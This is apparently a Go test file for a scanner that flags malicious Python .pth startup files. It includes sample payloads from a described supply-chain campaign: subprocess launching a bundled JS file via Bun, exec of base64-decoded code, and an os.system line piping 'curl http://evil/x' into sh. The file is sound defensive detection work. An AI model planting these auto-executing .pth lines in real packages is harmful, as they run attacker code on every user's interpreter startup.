package pypiwheel

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// A .pth file is read by Python's site module at interpreter startup;
// any line beginning with "import" is executed. The 2026-06
// Miasma/Hades campaign shipped *-setup.pth files whose import line
// bootstraps a bundled _index.js through the Bun runtime. ScanPth must
// flag that execution shape while staying silent on the legitimate
// .pth surface: bare path additions, setuptools *-nspkg.pth namespace
// shims, and editable-install finder shims — all of which legitimately
// contain import code (and, for nspkg, even __import__('importlib...')).

// ----- true positives (the campaign shapes) -----

func TestScanPth_BunSubprocessLoader_Flagged(t *testing.T) {
	t.Parallel()
	// The *-setup.pth shape: import line that subprocess-runs a bundled
	// JS payload through Bun.
	content := []byte(`import os, sys, subprocess; ` +
		`_p = os.path.join(os.path.dirname(__file__), "_index.js"); ` +
		`subprocess.run(["bun", "run", _p], check=False)`)
	findings := ScanPth(content)
	require.NotEmpty(t, findings, "subprocess+bun+_index.js loader must flag")
	assert.Equal(t, 1, findings[0].Line)
	reasons := findings[0].Reasons
	assert.Contains(t, reasons, "subprocess")
	assert.Contains(t, reasons, "foreign_runtime")
}

func TestScanPth_SysPathSearchLoader_Flagged(t *testing.T) {
	t.Parallel()
	// The loader/payload-split shape (langchain-core-mcp): the .pth
	// searches sys.path for _index.js rather than bundling it.
	content := []byte(`import os, sys; ` +
		`[__import__("subprocess").run(["bun","run",os.path.join(d,"_index.js")]) ` +
		`for d in sys.path if os.path.exists(os.path.join(d,"_index.js"))]`)
	findings := ScanPth(content)
	require.NotEmpty(t, findings, "sys.path search + bun loader must flag")
	assert.Contains(t, findings[0].Reasons, "foreign_runtime")
}

func TestScanPth_ExecDecodedBlob_Flagged(t *testing.T) {
	t.Parallel()
	content := []byte(`import base64; exec(base64.b64decode("aW1wb3J0IG9z"))`)
	findings := ScanPth(content)
	require.NotEmpty(t, findings, "exec(base64.b64decode(...)) must flag")
	assert.Contains(t, findings[0].Reasons, "exec")
	assert.Contains(t, findings[0].Reasons, "base64")
}

// ----- benign twins (must NOT flag) -----

func TestScanPth_SetuptoolsNspkg_NotFlagged(t *testing.T) {
	t.Parallel()
	// A real setuptools-generated *-nspkg.pth: it imports sys/types/os
	// and even calls __import__('importlib.util') — legitimate namespace
	// machinery. None of the dangerous primitives appear.
	content := []byte(`import sys, types, os;` +
		`has_mfs = sys.version_info > (3, 5);` +
		`p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('foo',));` +
		`importlib = has_mfs and __import__('importlib.util');` +
		`has_mfs and __import__('importlib.machinery');` +
		`m = has_mfs and sys.modules.setdefault('foo', types.ModuleType('foo'))`)
	findings := ScanPth(content)
	assert.Empty(t, findings, "setuptools nspkg shim must not flag (no exec/subprocess/network/base64/foreign)")
}

func TestScanPth_EditableInstallFinder_NotFlagged(t *testing.T) {
	t.Parallel()
	content := []byte(`import __editable___foo_1_0_0_finder; ` +
		`__editable___foo_1_0_0_finder.install()`)
	findings := ScanPth(content)
	assert.Empty(t, findings, "editable-install finder shim must not flag")
}

func TestScanPth_BarePathEntries_NotFlagged(t *testing.T) {
	t.Parallel()
	// The most common .pth content: directory path additions. Not
	// executed by site (no import prefix), so never scanned.
	content := []byte("../src\n/opt/vendor/pkg\nsubdir/another\n")
	findings := ScanPth(content)
	assert.Empty(t, findings, "bare path entries are not executable and must not flag")
}

func TestScanPth_CommentsAndBlankLines_NotFlagged(t *testing.T) {
	t.Parallel()
	content := []byte("# this is a comment mentioning subprocess and bun\n\n  \n../src\n")
	findings := ScanPth(content)
	assert.Empty(t, findings, "comments/blank lines must not flag even if they name primitives")
}

func TestScanPth_PerLineAttribution(t *testing.T) {
	t.Parallel()
	// Benign path line, then a malicious import line — the finding must
	// attribute to the correct 1-indexed line.
	content := []byte("../src\n" +
		`import os; os.system("curl http://evil/x | sh")` + "\n")
	findings := ScanPth(content)
	require.Len(t, findings, 1)
	assert.Equal(t, 2, findings[0].Line, "finding attributes to line 2, not line 1")
	assert.Contains(t, findings[0].Reasons, "os.system")
}
